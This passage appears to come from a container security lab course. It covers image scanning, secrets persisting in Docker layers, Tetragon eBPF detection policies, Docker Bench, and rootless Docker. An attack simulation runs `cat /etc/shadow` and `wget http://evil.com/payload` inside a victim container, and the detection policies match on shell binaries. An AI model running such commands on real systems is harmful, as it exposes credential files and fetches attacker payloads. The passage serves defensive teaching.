- Multi-stage build (builder + final)
- `python:3.11-alpine` as base
- Non-root `appuser`
- Minimal installed packages

```bash
docker build -f fastapi-improved-updated.Dockerfile -t fastapi-secure .
trivy image --security-checks vuln,config,secret fastapi-secure
```

**Compare the results** between `no-rules` and `fastapi-secure`.

### Inspect image layers with Dive

```bash
dive insecure-image
```

Look for:
- Secrets or credentials baked into layers
- Unnecessarily large layers
- Files that should have been excluded via `.dockerignore`

### Exercise: Prove that "deleting isn't removing" in OverlayFS

This exercise demonstrates that deleting a file in a later Dockerfile layer does **not** remove it from the image -- it only hides it behind a whiteout marker. The secret persists in the earlier layer.

**1. Build an image that adds then "deletes" a secret:**

```bash
cat > secret-leak.Dockerfile << 'EOF'
FROM alpine:3.20

# Layer 1: create a secret file
RUN echo "DB_PASSWORD=SuperSecret123!" > /tmp/credentials.txt

# Layer 2: "delete" the secret (students expect this to remove it)
RUN rm /tmp/credentials.txt

CMD ["echo", "No secrets here... or are there?"]
EOF

docker build -t secret-leak -f secret-leak.Dockerfile .
```

**2. Verify the file is gone at runtime:**

```bash
docker run --rm secret-leak cat /tmp/credentials.txt
# cat: can't open '/tmp/credentials.txt': No such file or directory
```

The file appears deleted. But is it really gone?

**3. Use `docker history` to inspect the layers:**

```bash
docker history secret-leak
```

Notice that the `RUN echo "DB_PASSWORD=..."` layer is still listed with a non-zero size -- the data is still there.

**4. Use Dive to find the secret in the earlier layer:**

```bash
dive secret-leak
```

Navigate to the layer created by `RUN echo "DB_PASSWORD=..."`. You'll see `/tmp/credentials.txt` still exists in that layer. The `RUN rm` layer only added a whiteout marker.

**5. Extract the secret directly from the image layers:**

```bash
# Save the image as a tar archive
docker save secret-leak -o secret-leak.tar
mkdir secret-leak-layers && tar xf secret-leak.tar -C secret-leak-layers

# Search every layer for the secret
grep -r "SuperSecret123" secret-leak-layers/
```

The secret is found in one of the layer tarballs -- proving that `rm` in a later layer does not erase data from earlier layers.

**Takeaway:** Never put secrets in any Dockerfile layer, even temporarily. Use multi-stage builds, build-time secrets (`--mount=type=secret`), or external secret stores instead.

---

## Part 5: Security Tools

### eBPF (Extended Berkeley Packet Filter)

**eBPF** is a technology that allows running sandboxed programs directly inside the Linux kernel — without modifying kernel source code or loading kernel modules. Originally designed for network packet filtering (BPF, 1992), it has evolved into a general-purpose in-kernel virtual machine used for security, observability, and networking.

**How eBPF works:**

1. A user-space program writes an eBPF program (usually in C or using libraries like libbpf)
2. The program is compiled to eBPF bytecode
3. The kernel **verifier** checks the bytecode for safety (no infinite loops, no invalid memory access, bounded execution)
4. If verified, the program is JIT-compiled to native machine code and attached to a **hook point** in the kernel
5. Every time the hook fires (e.g., a syscall, a network packet, a file open), the eBPF program runs and can collect data or make decisions

**eBPF hook points relevant to security:**

| Hook type | What it monitors | Example |
|---|---|---|
| **kprobes** | Any kernel function entry/exit | `security_file_open`, `security_bprm_check` |
| **tracepoints** | Predefined stable kernel events | `sched:sched_process_exec`, `syscalls:sys_enter_open` |
| **LSM hooks** | Linux Security Module decisions | File access, capability checks, task creation |
| **XDP** | Network packets at the driver level | Packet filtering before the kernel network stack |

**Why eBPF matters for container security:**
- **No kernel modules** — unlike older tools that need to compile and load `.ko` files for each kernel version, eBPF programs are portable via BTF (BPF Type Format) and CO-RE (Compile Once – Run Everywhere)
- **Low overhead** — eBPF programs run in kernel space, avoiding costly context switches between kernel and user space
- **Safety guaranteed** — the verifier ensures eBPF programs cannot crash the kernel, access arbitrary memory, or run forever
- **Real-time visibility** — observe every process execution, file access, network connection, and privilege change as it happens

**eBPF security tools ecosystem:**

| Tool | Maintainer | Focus |
|---|---|---|
| **Tetragon** | Cilium / Isovalent (CNCF) | Runtime security enforcement and observability using kprobes and LSM hooks |
| **Falco** | Sysdig (CNCF) | Rule-based runtime threat detection with a large community rule library |
| **Tracee** | Aqua Security | Runtime security and forensics with event tracing |
| **Cilium** | Isovalent (CNCF) | eBPF-based networking, load balancing, and network policy for Kubernetes |

### Tetragon

**Tetragon** is a CNCF runtime security tool that uses eBPF to monitor and enforce security policies at the kernel level. It was created by Isovalent (the company behind Cilium) and open-sourced in 2022.

**Key concepts:**

- **Process lifecycle tracking** — Tetragon hooks into the kernel's process execution path to track every process start and exit, including full process ancestry (parent → child chains)
- **TracingPolicy** — a Kubernetes CRD (or standalone YAML) that defines which kernel events to monitor. You specify a kernel function (kprobe), the arguments to capture, and selectors to filter events
- **Selectors** — filter events by argument values (`Prefix`, `Postfix`, `Equal`), by namespace (`matchNamespaces` to target only containers), or by capabilities and binary paths
- **Actions** — what to do when a policy matches: `Post` (report), `Sigkill` (kill the process), `Override` (change the return value)

**Tetragon architecture:**

```
┌─────────────────────────────────────────┐
│              User Space                  │
│  ┌──────────┐  ┌──────────────────────┐ │
│  │  tetra   │  │  tetragon daemon     │ │
│  │  (CLI)   │──│  - loads policies    │ │
│  │          │  │  - exports events    │ │
│  └──────────┘  │  - gRPC API          │ │
│                └──────────┬───────────┘ │
├───────────────────────────┼─────────────┤
│              Kernel Space │             │
│  ┌────────────────────────▼──────────┐  │
│  │         eBPF Programs             │  │
│  │  - kprobes on kernel functions    │  │
│  │  - process execution tracking     │  │
│  │  - file access monitoring         │  │
│  │  - network observability          │  │
│  └───────────────────────────────────┘  │
└─────────────────────────────────────────┘
```

**What Tetragon can detect:**
- Process execution inside containers (shell spawning, unexpected binaries)
- Sensitive file access (`/etc/shadow`, `/etc/passwd`, private keys)
- Network connections to suspicious destinations
- Privilege escalation (capability changes, setuid usage)
- Kernel module loading

**Tetragon vs Falco:**

| Feature | Tetragon | Falco |
|---|---|---|
| **Technology** | Pure eBPF (kprobes, LSM hooks) | eBPF or kernel module |
| **Policy format** | TracingPolicy YAML (CRDs in K8s) | Rules in YAML with Falco syntax |
| **Enforcement** | Can kill processes (`Sigkill` action) | Detection only (alerts) |
| **Overhead** | Very low (in-kernel filtering) | Low to moderate |
| **Community rules** | Smaller but growing | Large library of community rules |
| **Kubernetes** | Native CRD integration via Helm | Supports K8s via Falcosidekick |
| **Portability** | Needs BTF-enabled kernel (5.8+) | Broader kernel support |

### Explore Tetragon

Tetragon is an eBPF-based runtime security tool by Cilium/Isovalent. Unlike Falco (which requires kernel modules or large BPF programs), Tetragon uses modern eBPF directly — no kernel module compilation needed. It monitors process execution, file access, and network activity in real time.

**1. Run Tetragon as a container:**

```bash
sudo docker run -d --name tetragon --rm \
  --pid=host --cgroupns=host \
  --privileged \
  -v /sys/kernel/btf/vmlinux:/var/run/tetragon/btf \
  -v /sys/fs/cgroup:/sys/fs/cgroup \
  -v /sys/kernel/tracing:/sys/kernel/tracing \
  -v /sys/kernel/debug:/sys/kernel/debug \
  quay.io/cilium/tetragon:v1.3.0
```

**2. Observe events in real time:**

```bash
sudo docker exec tetragon tetra getevents -o compact
```

You'll see all process starts (`🚀 process`) and exits (`💥 exit`) across the system. Open another terminal and run any command — it will appear in the Tetragon output immediately.

**3. Trigger a specific event:**

In another terminal:

```bash
sudo cat /etc/shadow
```

Back in the Tetragon output, you'll see:

```
🚀 process  /usr/bin/cat /etc/shadow
💥 exit     /usr/bin/cat /etc/shadow 0
```

Press `Ctrl+C` to stop watching events.

**4. Stop Tetragon:**

```bash
sudo docker stop tetragon
```

### Create custom tracing policies

Tetragon uses **TracingPolicy** YAML files to define what kernel events to monitor. Policies hook into kernel functions (kprobes) and filter by arguments.

**1. Write below `/etc` policy:**

Create `write-etc-policy.yaml`:

```bash
cat > write-etc-policy.yaml << 'EOF'
apiVersion: cilium.io/v1alpha1
kind: TracingPolicy
metadata:
  name: write-etc
spec:
  kprobes:
  - call: "security_file_open"
    syscall: false
    args:
    - index: 0
      type: "file"
    selectors:
    - matchArgs:
      - index: 0
        operator: "Prefix"
        values:
        - "/etc"
      matchActions:
      - action: Post
EOF
```

**Understanding the policy:**

| Field | Meaning |
|---|---|
| `kprobes` | Hook into kernel function calls |
| `call: "security_file_open"` | The LSM hook called when any file is opened |
| `args[0].type: "file"` | Capture the file path argument |
| `matchArgs[0].operator: "Prefix"` | Only match files whose path starts with... |
| `values: ["/etc"]` | ...the `/etc` directory |
| `matchActions: Post` | Report the event after it happens |

**2. Run Tetragon with the policy:**

```bash
sudo docker run -d --name tetragon --rm \
  --pid=host --cgroupns=host \
  --privileged \
  -v /sys/kernel/btf/vmlinux:/var/run/tetragon/btf \
  -v /sys/fs/cgroup:/sys/fs/cgroup \
  -v /sys/kernel/tracing:/sys/kernel/tracing \
  -v /sys/kernel/debug:/sys/kernel/debug \
  -v $(pwd)/write-etc-policy.yaml:/etc/tetragon/tetragon.tp.d/write-etc-policy.yaml \
  quay.io/cilium/tetragon:v1.3.0
```

**3. Watch for events and trigger:**

```bash
sudo docker exec tetragon tetra getevents -o compact
```

In another terminal, write to `/etc`:

```bash
sudo touch /etc/test_file_tetragon
```

You'll see Tetragon report the file open event on `/etc/test_file_tetragon`.

**4. Stop Tetragon:**

```bash
sudo docker stop tetragon
```

### Detect shell spawned in containers

**1. Create a shell detection policy:**

Create `container-shell-detect-policy.yaml`:

```bash
cat > container-shell-detect-policy.yaml << 'EOF'
apiVersion: cilium.io/v1alpha1
kind: TracingPolicy
metadata:
  name: shell-in-container
spec:
  kprobes:
  - call: "security_bprm_check"
    syscall: false
    args:
    - index: 0
      type: "linux_binprm"
    selectors:
    - matchArgs:
      - index: 0
        operator: "Postfix"
        values:
        - "/bash"
        - "/sh"
        - "/zsh"
        - "/ash"
      matchNamespaces:
      - namespace: Pid
        operator: NotIn
        values:
        - "host_ns"
      matchActions:
      - action: Post
EOF
```

**Understanding the policy:**

| Field | Meaning |
|---|---|
| `call: "security_bprm_check"` | LSM hook called when a binary is about to execute |
| `args[0].type: "linux_binprm"` | Capture the binary path |
| `matchArgs: Postfix` | Match binaries ending in `/bash`, `/sh`, `/zsh`, `/ash` |
| `matchNamespaces: Pid NotIn host_ns` | Only match processes in a **non-host** PID namespace (i.e., inside containers) |

**2. Run Tetragon with the shell detection policy:**

```bash
sudo docker run -d --name tetragon --rm \
  --pid=host --cgroupns=host \
  --privileged \
  -v /sys/kernel/btf/vmlinux:/var/run/tetragon/btf \
  -v /sys/fs/cgroup:/sys/fs/cgroup \
  -v /sys/kernel/tracing:/sys/kernel/tracing \
  -v /sys/kernel/debug:/sys/kernel/debug \
  -v $(pwd)/container-shell-detect-policy.yaml:/etc/tetragon/tetragon.tp.d/container-shell-detect-policy.yaml \
  quay.io/cilium/tetragon:v1.3.0
```

**3. Watch for events:**

```bash
sudo docker exec tetragon tetra getevents -o compact
```

**4. Trigger the alert:**

In another terminal:

```bash
docker run --rm -it alpine sh
```

Tetragon will show the shell execution event from inside the container's PID namespace.

**5. Stop Tetragon:**

```bash
sudo docker stop tetragon
```

### Full-circle: Detect the Part 2 attacks with Tetragon

In Part 2 you performed attacks (privilege escalation, docker exec into containers, docker socket abuse). Now create a Tetragon policy that would have detected them -- closing the loop between attack and defense.

**1. Create a policy that detects `docker exec` into any container:**

When an attacker runs `docker exec -it <container> sh`, the runc binary spawns a new process inside the container's PID namespace. This policy catches exactly that pattern:

```bash
cat > detect-exec-policy.yaml << 'EOF'
apiVersion: cilium.io/v1alpha1
kind: TracingPolicy
metadata:
  name: detect-container-exec
spec:
  kprobes:
  - call: "security_bprm_check"
    syscall: false
    args:
    - index: 0
      type: "linux_binprm"
    selectors:
    # Match any binary execution inside a container (non-host PID namespace)
    - matchNamespaces:
      - namespace: Pid
        operator: NotIn
        values:
        - "host_ns"
      matchActions:
      - action: Post
EOF
```

**Understanding:** Unlike the shell-detection policy (which only matches `/sh`, `/bash`, etc.), this policy catches **any** binary execution inside a container -- including an attacker running `curl`, `wget`, `python`, or compiled exploits.

**2. Run Tetragon with the policy:**

```bash
sudo docker run -d --name tetragon --rm \
  --pid=host --cgroupns=host \
  --privileged \
  -v /sys/kernel/btf/vmlinux:/var/run/tetragon/btf \
  -v /sys/fs/cgroup:/sys/fs/cgroup \
  -v /sys/kernel/tracing:/sys/kernel/tracing \
  -v /sys/kernel/debug:/sys/kernel/debug \
  -v $(pwd)/detect-exec-policy.yaml:/etc/tetragon/tetragon.tp.d/detect-exec-policy.yaml \
  quay.io/cilium/tetragon:v1.3.0
```

**3. Watch events and replay the Part 2 attack:**

```bash
# Terminal 1: watch Tetragon
sudo docker exec tetragon tetra getevents -o compact

# Terminal 2: start a target container
docker run -d --name victim alpine sleep 300

# Terminal 3: simulate the attacker from Part 2
docker exec -it victim sh -c "cat /etc/shadow; wget http://evil.com/payload"
```

Tetragon will report every binary execution (`sh`, `cat`, `wget`) inside the `victim` container -- the same attack you performed in Part 2, now detected.

**4. Discuss:** How would you modify this policy to **block** the attack instead of just logging it? (Hint: change `action: Post` to `action: Sigkill`.)

**5. Cleanup:**

```bash
sudo docker stop tetragon
docker stop victim
```

### Exercise: Monitor a real application with Tetragon

Check and run the Budibase docker-compose:

```bash
wget https://raw.githubusercontent.com/Budibase/budibase/master/hosting/docker-compose.yaml
docker compose up -d
```

Run Tetragon and observe the output:

```bash
sudo docker run -d --name tetragon --rm \
  --pid=host --cgroupns=host \
  --privileged \
  -v /sys/kernel/btf/vmlinux:/var/run/tetragon/btf \
  -v /sys/fs/cgroup:/sys/fs/cgroup \
  -v /sys/kernel/tracing:/sys/kernel/tracing \
  -v /sys/kernel/debug:/sys/kernel/debug \
  quay.io/cilium/tetragon:v1.3.0

sudo docker exec tetragon tetra getevents -o compact
```

You'll see all process execution events across the Budibase containers. Look for suspicious patterns like:
- Shells being spawned inside application containers
- Unexpected binaries executing
- Network-related processes starting

> **Tetragon vs Falco:** Tetragon uses pure eBPF (no kernel modules), has lower overhead, and integrates natively with Kubernetes via CRDs. Falco has a larger rule library and more community rules. Both are excellent for runtime security monitoring.

### Docker Bench for Security

Docker Bench for Security is an official script from Docker that checks your host and Docker daemon configuration against the CIS (Center for Internet Security) Docker Benchmark. It audits dozens of best practices in one command — a quick way to find misconfigurations.

**1. Run Docker Bench:**

```bash
docker run --rm --net host --pid host \
  -v /var/run/docker.sock:/var/run/docker.sock \
  -v /etc:/etc:ro \
  -v /usr/lib/systemd:/usr/lib/systemd:ro \
  -v /etc/docker:/etc/docker:ro \
  docker/docker-bench-security
```

**2. Understand the output:**

The script checks categories based on the CIS Docker Benchmark:

| Section | What it checks |
|---|---|
| **1 - Host Configuration** | Kernel parameters, audit rules, Docker partition |
| **2 - Docker Daemon** | TLS, logging, ulimits, live restore, userland proxy |
| **3 - Docker Files** | File permissions on Docker socket, config files, certificates |
| **4 - Container Images** | Root user, HEALTHCHECK, content trust |
| **5 - Container Runtime** | Privileged mode, capabilities, read-only fs, PID limits, resource constraints |
| **7 - Docker Swarm** | Swarm mode security settings |

Each check is marked as:
- `[PASS]` — configuration follows the recommendation
- `[WARN]` — potential security issue found
- `[INFO]` — informational finding
- `[NOTE]` — manual verification needed

**3. Test with a running container:**

Start an insecure container, then re-run the benchmark:

```bash
docker run -d --name insecure --privileged debian sleep 300
docker run --rm --net host --pid host \
  -v /var/run/docker.sock:/var/run/docker.sock \
  -v /etc:/etc:ro \
  -v /usr/lib/systemd:/usr/lib/systemd:ro \
  -v /etc/docker:/etc/docker:ro \
  docker/docker-bench-security
```

Look for warnings in **Section 5** about the `insecure` container — it will flag the `--privileged` flag, missing resource limits, and more.

**4. Cleanup:**

```bash
docker stop insecure && docker rm insecure
```

> **Tip:** Run Docker Bench regularly in CI/CD or as a cron job. Pipe the output to a file (`> bench-results.txt`) and track improvements over time.

---

## Part 6: Sandboxing

### Rootless Docker

Run the Docker daemon as a normal user to prevent host root compromise.

**1. Install Docker (if not already installed):**

```bash
sudo apt-get install ca-certificates curl
sudo install -m 0755 -d /etc/apt/keyrings
sudo curl -fsSL https://download.docker.com/linux/ubuntu/gpg -o /etc/apt/keyrings/docker.asc
sudo chmod a+r /etc/apt/keyrings/docker.asc

echo \
  "deb [arch=$(dpkg --print-architecture) signed-by=/etc/apt/keyrings/docker.asc] https://download.docker.com/linux/ubuntu \
  $(. /etc/os-release && echo "${UBUNTU_CODENAME:-$VERSION_CODENAME}") stable" | \
  sudo tee /etc/apt/sources.list.d/docker.list > /dev/null

sudo apt-get update
sudo apt-get install docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-plugin
```

Verify dockerd runs as root:

```bash
ps -ef | grep dockerd
```

**2. Install rootless Docker:**

```bash
sudo apt-get install docker-ce-rootless-extras
sudo apt install -y uidmap
dockerd-rootless-setuptool.sh install
systemctl --user start docker
systemctl --user enable docker
```

**3. Switch to rootless context and verify:**

```bash
docker context use rootless
docker info | grep rootless
```

**4. Compare rootless vs root containers:**

Run a container in rootless mode:

```bash
docker run -d --rm --name test-rootless alpine sleep 100
ps -ef | grep sleep
docker exec test-rootless id
```

Switch back to default (root) Docker and run the same:

```bash
docker context use default
sudo docker run -d --rm --name test-root alpine sleep 200
ps -ef | grep sleep
```

**Observe the difference:** The rootless container's process runs as your normal user, while the default container's process runs as root. This is the key security benefit — even if an attacker escapes the container, they land as an unprivileged user on the host.

### Understanding: Rootless mode vs userns-remap

Students often confuse these two. They both use user namespaces, but at different levels.

**Run both side-by-side and compare `ps -ef` output on the host:**

```bash
# Terminal 1: Rootless mode (daemon + container both unprivileged)
docker context use rootless
docker run -d --rm --name rootless-test alpine sleep 300

# Terminal 2: Default Docker with userns-remap (daemon runs as ROOT, container remapped)
docker context use default
# Enable userns-remap by adding to /etc/docker/daemon.json:
# { "userns-remap": "default" }
# Then: sudo systemctl restart docker
sudo docker run -d --rm --name remap-test alpine sleep 300

# Terminal 3: Default Docker without remap (daemon + container both root)
sudo docker run -d --rm --name root-test alpine sleep 300
```

**Now compare all three from the host:**

```bash
echo "=== Rootless mode ==="
ps -eo pid,user,args | grep "sleep 300" | grep -v grep

echo "=== userns-remap mode ==="
ps -eo pid,user,args | grep "sleep 300" | grep -v grep

echo "=== Default root mode ==="
ps -eo pid,user,args | grep "sleep 300" | grep -v grep
```

**Expected results:**

| Mode | Docker daemon runs as | Container process on host | Container escape lands as |
|---|---|---|---|
| **Default (root)** | `root` | `root` | `root` -- full host compromise |
| **userns-remap** | `root` | `165536` (remapped UID) | Unprivileged user, but daemon is still root |
| **Rootless** | Your user (e.g., `ubuntu`) | Your user (e.g., `ubuntu`) | Unprivileged user, daemon also unprivileged |

> **Key takeaway:** userns-remap only remaps the container's UID -- the Docker daemon itself still runs as root, meaning a daemon exploit still gives root. True rootless mode runs **everything** (daemon + containers) unprivileged.

**Cleanup:**

```bash
docker stop rootless-test 2>/dev/null
sudo docker stop remap-test root-test 2>/dev/null
```